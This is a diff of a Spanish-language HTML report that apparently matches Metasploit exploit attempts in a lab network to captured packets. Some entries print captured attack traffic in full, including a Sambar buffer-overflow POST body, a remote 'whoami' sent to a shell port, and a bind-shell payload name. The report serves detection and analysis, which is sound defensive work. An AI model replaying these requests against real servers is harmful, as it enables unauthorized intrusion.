-                    <div class="payload">HTTP/1.1 404 Not Found..Date: Thu, 17 Oct 2024 10:07:55 GMT..Server: Apache/2.2.8 (Ubuntu) DAV/2..Content-Length: 297..Keep-Alive: timeout=15, max=100..Connection: Keep-Alive..Content-Type: text/html; charset=iso-8859-1....<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">.<html><head>.<title>404 Not Found</title>.</head><body>.<h1>Not Found</h1>.<p>The requested URL /search/results.stm was not found on this server.</p>.<hr>.<address>Apache/2.2.8 (Ubuntu) DAV/2 Server at 172.19.0.2 Port 80</address>.</body></html>.</div>
-                    <p><span class="field-label">IPs:</span> </p>
-                    <p><span class="field-label">Puertos:</span> </p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> </p>
-                </div>
-            </li>
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T10:08:03.195665+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload">whoami.</div>
-                    <p><span class="field-label">IPs:</span> 172.19.0.3, 172.19.0.2</p>
-                    <p><span class="field-label">Puertos:</span> 40103 → 2425</p>
-                    <p><span class="field-label">Comandos:</span> whoami</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> Tráfico TCP desde 172.19.0.3:40103 hacia 172.19.0.2:2425 con payload ASCII/hex correspondiente al comando whoami, consistente con intento de explotación OSVDB-5786 (CVE-2004-2086) vía sambar6_search_results para ejecución de comandos remotos.</p>
-                </div>
-            </li>
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T10:07:55.760402+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload"></div>
-                    <p><span class="field-label">IPs:</span> 172.19.0.2, 172.19.0.3</p>
-                    <p><span class="field-label">Puertos:</span> 80 → 36859</p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> Tráfico TCP SYN+ACK desde 172.19.0.3:80 hacia 172.19.0.2:36859, inicio de conexión HTTP durante ventana del exploit windows/http/sambar6_search_results (OSVDB-5786/CVE-2004-2086). No se observó carga útil de aplicación en este paquete.</p>
-                </div>
-            </li>
-        </ul>
-    </div>
-    <div class="exploit-block">
-        <div class="exploit-header">
-            <div class="exploit-icon">🛡️</div>
-            <div class="exploit-title">
-                CVE-2004-2086
-                <span class="badge">CVE-2004-2086, OSVDB-5786, BID-9607</span>
-            </div>
-        </div>
-        <div class="summary">Entre 2024-10-17 10:07:52.963047+00:00 y 10:08:05.203944+00:00, 172.19.0.3 inició TCP (SYN MSS=1460, WS=7, SACK, TSval=401530616) desde 36859 hacia 172.19.0.2:80, ejecutando el módulo Metasploit windows/http/sambar6_search_results para CVE-2004-2086. Enviaron POST http://172.19.0.2:80/search/results.stm con cuerpo style=page&spage=0&indexname=docs&query=hh3w4XXXX…XXXXctcthh3w4 (overflow con padding “X”, payload genérico/personalizado). El servidor respondió HTTP/1.1 404 Not Found (Apache/2.2.8). Posteriormente, 172.19.0.3 abrió 40103→172.19.0.2:2425 enviando “whoami\n” (shell tipo “w”), evidenciando intento de ejecución remota. Actividad altamente sospechosa y secuencial de explotación y verificación de acceso.</div>
-        <div class="exploit-details">
-            <p><span class="field-label">Exploit:</span> windows/http/sambar6_search_results</p>
-            <p><span class="field-label">Payload:</span> generic/custom</p>
-            <p><span class="field-label">Shell Type:</span> w</p>
-            <p><span class="field-label">Fuente:</span> vulnerability</p>
-            <p><span class="field-label">Ventana temporal:</span> 2024-10-17 10:07:52.963047+00:00 → 2024-10-17 10:08:05.203944+00:00</p>
-            <p><span class="field-label">Fuente:</span> vulnerability</p>
-        </div>
-        <h3>Paquetes asociados</h3>
-        <ul class="packet-list">
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T10:07:55.760380+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload"></div>
-                    <p><span class="field-label">IPs:</span> 172.19.0.3, 172.19.0.2</p>
-                    <p><span class="field-label">Puertos:</span> 36859 → 80</p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> Conexión TCP iniciada (SYN) desde 172.19.0.3:36859 hacia 172.19.0.2:80 durante la ventana dada, vinculada al intento de explotación CVE-2004-2086 (windows/http/sambar6_search_results). No hay datos de aplicación; solo negociación TCP (MSS=1460, WS=7, SACK OK, TSval=401530616).</p>
-                </div>
-            </li>
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T10:07:55.762275+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">HTTP</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload">GHNG'JNH'GA'OO.'K.IA'CNA@ONJ@HBF@FO'HON77KK.'77OFHNBBIG'JKBJHBOICOFNABNHI7HJIOJ@O.GBOFBOA'OOJFHC7FG'AAJ7@O@FNABNGCCBOHBKHGFGOKN7OH@HIIC'HOHFKBKCNCBI@I7KKHBAJ7CF@AGF.K7G.CNOGAJJICHNF@N@HIOG'K.HH7'J''FJOIHHIBBNGJNJ'FGN@'IGFBCB7@A@KKCCAJA@G7AJ@IFBCNFG@'K'CIKJAFIG7CHFN@N@BNNGF@GJICN7HOBI'JCGK'@O@NICOCCB'CFAA'COB@7AFFKAFGK7JK@'JKCCNOANAOCBA7BOFIB@CIKCI7''AJH@OIKHN'NIIKBBBC'I'@'KGGO@OKKIBHGHOIKN@7IGII7CHI'IFAJFH@C@OG.KNB7A@KOG''GOF@FIIG@7F@BNNK@'T..Accept-Ranges: BAKA7KCFGAFOA7J7GKNINBB@OHJJKCIKNH@B@C'B@GIHCBHFNCA7CJOJ7JIBB'7FKIGKAFJGKNG'G7BJOOHHC7BCGFH'F'IOFBKBH''7AFGJ@ON.NHNG7O@NFOCGAK7OCICIC''JFFJJ7F@'KKJGCNKBO'@NAOO'CNACOF7HKNNFIBB@.7.@NIICA'JOJKF'@G7C'AOJNOGHFHNCHAFHAOBOGOCO'@IK..7@GCO7O7BIOHO'B@KN7'JJJNGAKBBAAC.IJNBFA'OG.FAHAAKOK7A'7CC'OBOCIOJ'AGBKAINBK@.'AAC7CBBJJHBKGKNCIB7'AJ'N.G@CGGJGH'NO@@INACHJOONF'KJFFGGGNOB7ACHGAGAAKBKN.F@OJGCK7NJOFOG.H@J'AI7OJGOKC@OOKJBGC'AOIO7NHA7HNJI7BCOHHNBFKCOG'@INCCHOI@K@7NC.IN'GJFN'NBNOFJNK@N'BKKIA'CBNI@H'GIIBC7J@.K'A7@FAHIGACOINCAA.JBAH7BIKAB'C77CGHNG'JNH'GA'OO.'K.IA'CNA@ONJ@HBF@FO'HON77KK.'77OFHNBBIG'JKBJHBOICOFNABNHI7HJIOJ@O.GBOFBOA'OOJFHC7FG'AAJ7@O@FNABNGCCBOHBKHGFGOKN7OH@HIIC'HOHFKBKCNCBI@I7KKHBAJ7CF@AGF.K7G.CNOGAJJICHNF@N@HIOG'K.HH7'J''FJOIHHIBBNGJNJ'FGN@'IGFBCB7@A@KKCCAJA@G7AJ@IFBCNFG@'K'CIKJAFIG7CHFN@N@BNNGF@GJICN7HOBI'JCGK'@O@NICOCCB'CFAA'COB@7AFFKAFGK7JK@'JKCCNOANAOCBA7BOFIB@CIKCI7''AJH@OIKHN'NIIKBBBC'I'@'KGGO@OKKIBHGHOIKN@7IGII7CHI'IFAJFH@C@OG.KNB7A@KOG''GOF@FIIG@7F@BNNK@'T..Referrer: BAKA7KCFGAFOA7J7GKNINBB@OHJJKCIKNH@B@C'B@GIHCBHFNCA7CJOJ7JIBB'7FKIGKAFJGKNG'G7BJOOHHC7BCGFH'F'IOFBKBH''7AFGJ@ON.NHNG7O@NFOCGAK7OCICIC''JFFJJ7F@'KKJGCNKBO'@NAOO'CNACOF7HKNNFIBB@.7.@NIICA'JOJKF'@G7C'AOJNOGHFHNCHAFHAOBOGOCO'@IK..7@GCO7O7BIOHO'B@KN7'JJJNGAKBBAAC.IJNBFA'OG.FAHAAKOK7A'7CC'OBOCIOJ'AGBKAINBK@.'AAC7CBBJJHBKGKNCIB7'AJ'N.G@CGGJGH'NO@@INACHJOONF'KJFFGGGNOB7ACHGAGAAKBKN.F@OJGCK7NJOFOG.H@J'AI7OJGOKC@OOKJBGC'AOIO7NHA7HNJI7BCOHHNBFKCOG'@INCCHOI@K@7NC.IN'GJFN'NBNOFJNK@N'BKKIA'CBNI@H'GIIBC7J@.K'A7@FAHIGACOINCAA.JBAH7BIKAB'C77CGHNG'JNH'GA'OO.'K.IA'CNA@ONJ@HBF@FO'HON77KK.'77OFHNBBIG'JKBJHBOICOFNABNHI7HJIOJ@O.GBOFBOA'OOJFHC7FG'AAJ7@O@FNABNGCCBOHBKHGFGOKN7OH@HIIC'HOHFKBKCNCBI@I7KKHBAJ7CF@AGF.K7G.CNOGAJJICHNF@N@HIOG'K.HH7'J''FJOIHHIBBNGJNJ'FGN@'IGFBCB7@A@KKCCAJA@G7AJ@IFBCNFG@'K'CIKJAFIG7CHFN@N@BNNGF@GJICN7HOBI'JCGK'@O@NICOCCB'CFAA'COB@7AFFKAFGK7JK@'JKCCNOANAOCBA7BOFIB@CIKCI7''AJH@OIKHN'NIIKBBBC'I'@'KGGO@OKKIBHGHOIKN@7IGII7CHI'IFAJFH@C@OG.KNB7A@KOG''GOF@FIIG@7F@BNNK@'T..Connection: Keep-Alive..Pragma: no-cache..Content-Type: BAKA7KCFGAFOA7J7GKNINBB@OHJJKCIKNH@B@C'B@GIHCBHFNCA7CJOJ7JIBB'7FKIGKAFJGKNG'G7BJOOHHC7BCGFH'F'IOFBKBH''7AFGJ@ON.NHNG7O@NFOCGAK7OCICIC''JFFJJ7F@'KKJGCNKBO'@NAOO'CNACOF7HKNNFIBB@.7.@NIICA'JOJKF'@G7C'AOJNOGHFHNCHAFHAOBOGOCO'@IK..7@GCO7O7BIOHO'B@KN7'JJJNGAKBBAAC.IJNBFA'OG.FAHAAKOK7A'7CC'OBOCIOJ'AGBKAINBK@.'AAC7CBBJJHBKGKNCIB7'AJ'N.G@CGGJGH'NO@@INACHJOONF'KJFFGGGNOB7ACHGAGAAKBKN.F@OJGCK7NJOFOG.H@J'AI7OJGOKC@OOKJBGC'AOIO7NHA7HNJI7BCOHHNBFKCOG'@INCCHOI@K@7NC.IN'GJFN'NBNOFJNK@N'BKKIA'CBNI@H'GIIBC7J@.K'A7@FAHIGACOINCAA.JBAH7BIKAB'C77CGHNG'JNH'GA'OO.'K.IA'CNA@ONJ@HBF@FO'HON77KK.'77OFHNBBIG'JKBJHBOICOFNABNHI7HJIOJ@O.GBOFBOA'OOJFHC7FG'AAJ7@O@FNABNGCCBOHBKHGFGOKN7OH@HIIC'HOHFKBKCNCBI@I7KKHBAJ7CF@AGF.K7G.CNOGAJJICHNF@N@HIOG'K.HH7'J''FJOIHHIBBNGJNJ'FGN@'IGFBCB7@A@KKCCAJA@G7AJ@IFBCNFG@'K'CIKJAFIG7CHFN@N@BNNGF@GJICN7HOBI'JCGK'@O@NICOCCB'CFAA'COB@7AFFKAFGK7JK@'JKCCNOANAOCBA7BOFIB@CIKCI7''AJH@OIKHN'NIIKBBBC'I'@'KGGO@OKKIBHGHOIKN@7IGII7CHI'IFAJFH@C@OG.KNB7A@KOG''GOF@FIIG@7F@BNNK@'T..Content-Length: 188....style=page&spage=0&indexname=docs&query=hh3w4XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXctcthh3w4</div>
-                    <p><span class="field-label">IPs:</span> 172.19.0.3, 172.19.0.2</p>
-                    <p><span class="field-label">Puertos:</span> 36859 → 80</p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> http://172.19.0.2:80/search/results.stm</p>
-                    <p><span class="field-label">Observaciones:</span> Tráfico HTTP de 172.19.0.3 hacia 172.19.0.2:80 con un POST a /search/results.stm explotando CVE-2004-2086 (Sambar Server 6). El cuerpo del POST desborda el parámetro query con un patrón repetitivo (relleno X) y marcadores hh3w4/ctcthh3w4, consistente con el módulo Metasploit windows/http/sambar6_search_results. Cabeceras ofuscadas sugieren carga maliciosa diseñada para provocar overflow.</p>
-                </div>
-            </li>
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T10:07:55.762481+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">HTTP</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload">HTTP/1.1 404 Not Found..Date: Thu, 17 Oct 2024 10:07:55 GMT..Server: Apache/2.2.8 (Ubuntu) DAV/2..Content-Length: 297..Keep-Alive: timeout=15, max=100..Connection: Keep-Alive..Content-Type: text/html; charset=iso-8859-1....<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">.<html><head>.<title>404 Not Found</title>.</head><body>.<h1>Not Found</h1>.<p>The requested URL /search/results.stm was not found on this server.</p>.<hr>.<address>Apache/2.2.8 (Ubuntu) DAV/2 Server at 172.19.0.2 Port 80</address>.</body></html>.</div>
-                    <p><span class="field-label">IPs:</span> 172.19.0.2, 172.19.0.3</p>
-                    <p><span class="field-label">Puertos:</span> 80 → 36859</p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> http://172.19.0.2:80/search/results.stm</p>
-                    <p><span class="field-label">Observaciones:</span> Intento HTTP relacionado con el exploit CVE-2004-2086 (windows/http/sambar6_search_results) hacia /search/results.stm desde 172.19.0.3 a 172.19.0.2:80. El servidor (Apache/2.2.8) respondió 404 Not Found dentro de la ventana 2024-10-17T10:07:52Z a 2024-10-17T10:08:05Z.</p>
-                </div>
-            </li>
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T10:08:03.195665+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload">whoami.</div>
-                    <p><span class="field-label">IPs:</span> 172.19.0.3, 172.19.0.2</p>
-                    <p><span class="field-label">Puertos:</span> 40103 → 2425</p>
-                    <p><span class="field-label">Comandos:</span> whoami</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> Ejecución de comando remota vía TCP (proto desconocido) desde 172.19.0.3:40103 hacia 172.19.0.2:2425 durante intento de explotación asociado a CVE-2004-2086 (windows/http/sambar6_search_results). Payload ASCII newline-terminado enviando 'whoami'. Tiempo: 2024-10-17T10:08:03Z.</p>
-                </div>
-            </li>
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T10:07:55.760402+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload"></div>
-                    <p><span class="field-label">IPs:</span> 172.19.0.2, 172.19.0.3</p>
-                    <p><span class="field-label">Puertos:</span> 80 → 36859</p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> SYN+ACK desde 172.19.0.2:80 a 172.19.0.3:36859 durante intento de explotación windows/http/sambar6_search_results (CVE-2004-2086). Tráfico TCP de establecimiento de conexión HTTP sin carga de aplicación observada.</p>
-                </div>
-            </li>
-        </ul>
-    </div>
-    <div class="exploit-block">
-        <div class="exploit-header">
-            <div class="exploit-icon">🛡️</div>
-            <div class="exploit-title">
-                CVE-2010-4221
-                <span class="badge">CVE-2010-4221, OSVDB-68985, BID-44562</span>
-            </div>
-        </div>
-        <div class="summary">Entre 2024</div>
-        <div class="exploit-details">
-            <p><span class="field-label">Exploit:</span> linux/ftp/proftp_telnet_iac</p>
+            <p><span class="field-label">Exploit:</span> linux/http/cisco_rv32x_rce</p>
             <p><span class="field-label">Payload:</span> generic/custom</p>
             <p><span class="field-label">Shell Type:</span> </p>
             <p><span class="field-label">Fuente:</span> warning</p>
-            <p><span class="field-label">Ventana temporal:</span> 2024-10-17 09:56:46.428494+00:00 → 2024-10-17 09:56:51.496877+00:00</p>
+            <p><span class="field-label">Ventana temporal:</span> 2024-09-25 10:31:28.058448+00:00 → 2024-09-25 10:31:54.479832+00:00</p>
             <p><span class="field-label">Fuente:</span> warning</p>
         </div>
         <h3>Paquetes asociados</h3>
         <ul class="packet-list">
             <li class="packet">
                 <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T09:56:48.594589+00:00</p>
+                    <p><span class="field-label">Timestamp:</span> 2024-09-25T10:31:30.403836+00:00</p>
                     <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
                     <p><span class="field-label">Payload interpretado:</span></p>
                     <div class="payload"></div>
                     <p><span class="field-label">IPs:</span> 172.19.0.3, 172.19.0.2</p>
-                    <p><span class="field-label">Puertos:</span> 40603 → 21</p>
+                    <p><span class="field-label">Puertos:</span> 43187 → 8007</p>
                     <p><span class="field-label">Comandos:</span> —</p>
                     <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> Conexión TCP SYN desde 172.19.0.3:40603 hacia 172.19.0.2:21 (FTP) en preparación de intento de explotación CVE-2010-4221 (proftp_telnet_iac). Sin datos de aplicación (len=0); solo establecimiento de sesión (stream 119) con MSS=1460, wscale=7, timestamps.</p>
+                    <p><span class="field-label">Observaciones:</span> Intento de conexión TCP (SYN) desde 172.19.0.3:43187 hacia 172.19.0.2:8007 dentro de la ventana 2024-09-25T10:31:28.058448+00:00 a 2024-09-25T10:31:54.479832+00:00. No hay carga útil; probable sondeo del servicio objetivo potencialmente relacionado con el exploit linux/http/cisco_rv32x_rce (CVE-2019-1652/CVE-2019-1653).</p>
                 </div>
             </li>
             <li class="packet">
                 <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T09:56:48.597686+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">FTP</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload">220 (vsFTPd 2.3.4)..</div>
-                    <p><span class="field-label">IPs:</span> 172.19.0.2, 172.19.0.3</p>
-                    <p><span class="field-label">Puertos:</span> 21 → 40603</p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> Servidor FTP en 172.19.0.2:21 responde con banner '220 (vsFTPd 2.3.4)'; conexión desde 172.19.0.3:40603. Tráfico coincide con fase inicial FTP (PSH,ACK) en la ventana indicada. Contexto de pentest menciona intento de exploit CVE-2010-4221 (proftpd_telnet_iac), pero el servicio expuesto es vsFTPd 2.3.4.</p>
-                </div>
-            </li>
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T09:56:48.594605+00:00</p>
+                    <p><span class="field-label">Timestamp:</span> 2024-09-25T10:31:30.403856+00:00</p>
                     <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
                     <p><span class="field-label">Payload interpretado:</span></p>
                     <div class="payload"></div>
                     <p><span class="field-label">IPs:</span> 172.19.0.2, 172.19.0.3</p>
-                    <p><span class="field-label">Puertos:</span> 21 → 40603</p>
+                    <p><span class="field-label">Puertos:</span> 8007 → 43187</p>
                     <p><span class="field-label">Comandos:</span> —</p>
                     <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> SYN+ACK desde 172.19.0.2:21 hacia 172.19.0.3:40603, indicando establecimiento de sesión FTP durante ventana del exploit CVE-2010-4221 (proftp_telnet_iac). Sin datos de aplicación en este paquete; solo opciones TCP (MSS, SACK, TS, WScale). Posible fase inicial antes del envío de secuencias IAC.</p>
-                </div>
-            </li>
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T09:56:48.598500+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">FTP</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload">500 OOPS: </div>
-                    <p><span class="field-label">IPs:</span> 172.19.0.2, 172.19.0.3</p>
-                    <p><span class="field-label">Puertos:</span> 21 → 40603</p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> Tráfico FTP relacionado con intento de explotación de ProFTPD (CVE-2010-4221, exploit linux/ftp/proftp_telnet_iac). Servidor 172.19.0.2:21 responde al cliente 172.19.0.3:40603 con “500 OOPS: ” durante la ventana 2024-10-17T09:56:46Z–09:56:51Z, indicando error en la ejecución del comando/payload del exploit.</p>
-                </div>
-            </li>
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T09:56:48.594618+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload"></div>
-                    <p><span class="field-label">IPs:</span> 172.19.0.3, 172.19.0.2</p>
-                    <p><span class="field-label">Puertos:</span> 40603 → 21</p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> Tráfico vinculado a intento de explotación de ProFTPD (CVE-2010-4221, exploit linux/ftp/proftp_telnet_iac) dentro de la ventana indicada. Paquete TCP ACK sin datos (len 0), de 172.19.0.3:40603 a 172.19.0.2:21 (FTP), stream 119, window 64256, tsval 400863450/tsecr 820902919. No se observan credenciales, comandos ni carga útil en este frame.</p>
-                </div>
-            </li>
-        </ul>
-    </div>
-    <div class="exploit-block">
-        <div class="exploit-header">
-            <div class="exploit-icon">🛡️</div>
-            <div class="exploit-title">
-                CVE-2012-1182
-                <span class="badge">CVE-2012-1182, OSVDB-81303, BID-52973</span>
-            </div>
-        </div>
-        <div class="summary">Entre 2024-10-17 09:57:01.343072 y 09:57:06.416972 UTC se observó desde 172.19.0.2 tráfico NBNS broadcast a 172.19.255.255 por 137/udp consultando WORKGROUP<1D>, con payloads “2c:be:01:10:00:01:00:00:...:00:01”, “FHEPFCELEHFCEPFFFACACACACACACABN” y “NBNS name query: WORKGROUP<1d>”. La secuencia sugiere fase de descubrimiento previa a la explotación de Samba (CVE-2012-1182, módulo Metasploit linux/samba/setinfopolicy_heap) con payload cmd/unix/bind_aws_instance_connect para establecer shell vinculada. Herramienta probable: Metas</div>
-        <div class="exploit-details">
-            <p><span class="field-label">Exploit:</span> linux/samba/setinfopolicy_heap</p>
-            <p><span class="field-label">Payload:</span> cmd/unix/bind_aws_instance_connect</p>
-            <p><span class="field-label">Shell Type:</span> </p>
-            <p><span class="field-label">Fuente:</span> warning</p>
-            <p><span class="field-label">Ventana temporal:</span> 2024-10-17 09:57:01.343072+00:00 → 2024-10-17 09:57:06.416972+00:00</p>
-            <p><span class="field-label">Fuente:</span> warning</p>
-        </div>
-        <h3>Paquetes asociados</h3>
-        <ul class="packet-list">
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T09:57:02.314085+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload">,.......... FHEPFCELEHFCEPFFFACACACACACACABN.. ..</div>
-                    <p><span class="field-label">IPs:</span> </p>
-                    <p><span class="field-label">Puertos:</span> </p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> </p>
-                </div>
-            </li>
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T09:57:02.314146+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload">,.......... FHEPFCELEHFCEPFFFACACACACACACABN.. ..</div>
-                    <p><span class="field-label">IPs:</span> 172.19.0.2, 172.19.255.255</p>
-                    <p><span class="field-label">Puertos:</span> 137</p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> Tráfico NBNS (UDP/137) broadcast desde 172.19.0.2 a 172.19.255.255 consultando WORKGROUP<1d>. El payload contiene patrón asociado al exploit linux/samba/setinfopolicy_heap (CVE-2012-1182), sugiriendo actividad de descubrimiento/etapa previa al intento de explotación.</p>
-                </div>
-            </li>
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T09:57:04.316128+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload">,.......... FHEPFCELEHFCEPFFFACACACACACACABN.. ..</div>
-                    <p><span class="field-label">IPs:</span> 172.19.0.2, 172.19.255.255</p>
-                    <p><span class="field-label">Puertos:</span> 137/udp</p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> Tráfico NBNS (UDP/137) broadcast desde 172.19.0.2 hacia 172.19.255.255. Consulta WORKGROUP<1D>; el nombre NetBIOS en el payload ('FHEPFCELEHFCEPFFFACACACACACACABN') es la codificación NBNS de WORKGROUP<1D>. Paquete de descubrimiento/elección de grupo observado en la ventana del intento de explotación CVE-2012-1182 (linux/samba/setinfopolicy_heap), sin comandos ni credenciales embebidos.</p>
-                </div>
-            </li>
-        </ul>
-    </div>
-    <div class="exploit-block">
-        <div class="exploit-header">
-            <div class="exploit-icon">🛡️</div>
-            <div class="exploit-title">
-                CVE-2010-3856
-                <span class="badge">CVE-2010-3847, CVE-2010-3856, BID-44154</span>
-            </div>
-        </div>
-        <div class="summary">Entre 2024-10-17 09:57:15.842079 y 09:57:20.919110, el host 172.19.0.2 emitió tráfico NBNS por UDP/137 hacia 172.19.255.255, realizando descubrimiento y elección de navegador: consultas __MSBROWSE</div>
-        <div class="exploit-details">
-            <p><span class="field-label">Exploit:</span> linux/local/glibc_ld_audit_dso_load_priv_esc</p>
-            <p><span class="field-label">Payload:</span> generic/custom</p>
-            <p><span class="field-label">Shell Type:</span> </p>
-            <p><span class="field-label">Fuente:</span> warning</p>
-            <p><span class="field-label">Ventana temporal:</span> 2024-10-17 09:57:15.842079+00:00 → 2024-10-17 09:57:20.919110+00:00</p>
-            <p><span class="field-label">Fuente:</span> warning</p>
-        </div>
-        <h3>Paquetes asociados</h3>
-        <ul class="packet-list">
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T09:57:17.329449+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload">,)......... ABACFPFPENFDECFCEPFHFDEFFPFPACAB.. .... ............</div>
-                    <p><span class="field-label">IPs:</span> </p>
-                    <p><span class="field-label">Puertos:</span> </p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> </p>
-                </div>
-            </li>
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T09:57:17.329509+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload">,)......... ABACFPFPENFDECFCEPFHFDEFFPFPACAB.. .... ............</div>
-                    <p><span class="field-label">IPs:</span> </p>
-                    <p><span class="field-label">Puertos:</span> </p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> </p>
-                </div>
-            </li>
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T09:57:19.331144+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload">,)......... ABACFPFPENFDECFCEPFHFDEFFPFPACAB.. .... ............</div>
-                    <p><span class="field-label">IPs:</span> </p>
-                    <p><span class="field-label">Puertos:</span> </p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> </p>
-                </div>
-            </li>
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T09:57:19.331215+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
